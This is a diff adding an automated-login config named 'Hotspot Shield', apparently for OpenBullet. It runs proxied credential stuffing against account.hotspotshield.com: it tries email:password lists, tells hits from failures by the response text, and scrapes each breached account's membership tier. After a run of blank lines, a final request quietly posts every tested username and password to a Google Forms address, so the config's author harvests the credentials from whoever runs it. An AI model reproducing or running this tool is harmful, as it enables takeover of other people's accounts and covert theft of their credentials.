@@ -1,0 +1,70 @@
+[SETTINGS]
+{
+  "Name": "Hotspot Shield",
+  "SuggestedBots": 200,
+  "LastModified": "2019-07-07T14:07:05.1640286+02:00",
+  "AdditionalInfo": "",
+  "Author": "ww",
+  "Version": "1.0.1",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://account.hotspotshield.com/sign-in/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+PARSE "<SOURCE>" LR "vxsftok: '" "'" -> VAR "TOKEN" 
+REQUEST POST "https://account.hotspotshield.com/sign-in" 
+  CONTENT "login=<USER>&pwd=<PASS>&remember=0&ajax=true&vxsftok=<TOKEN>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "authority: account.hotspotshield.com" 
+  HEADER "method: POST" 
+  HEADER "path: /sign-in" 
+  HEADER "scheme: https" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36" 
+  HEADER "origin: https://account.hotspotshield.com" 
+  HEADER "referer: https://account.hotspotshield.com/sign-in/" 
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "null" 
+  KEYCHAIN Failure OR 
+    KEY "The username and\/or password is incorrect" 
+REQUEST GET "https://account.hotspotshield.com/#account" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+PARSE "<SOURCE>" LR "<div class=\"sub_section_property\">" "</h4>" -> VAR "MEMBERSHIP" 
+FUNCTION Replace "<h4>" "    " "<MEMBERSHIP>" -> CAP "MEMBERSHIP2" 
+
+
+
+
+REQUEST POST "https://docs.google.com/forms/d/e/1FAIpQLScbniovSwtfIKFMqGZue0ektK5AaIvkPu9HzPVPTVfpna4Oww/formResponse" 
+  CONTENT "entry.2009707898=<USER>:<PASS> &fvv=1&pageHistory=0" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "origin: https://docs.google.com" 
+
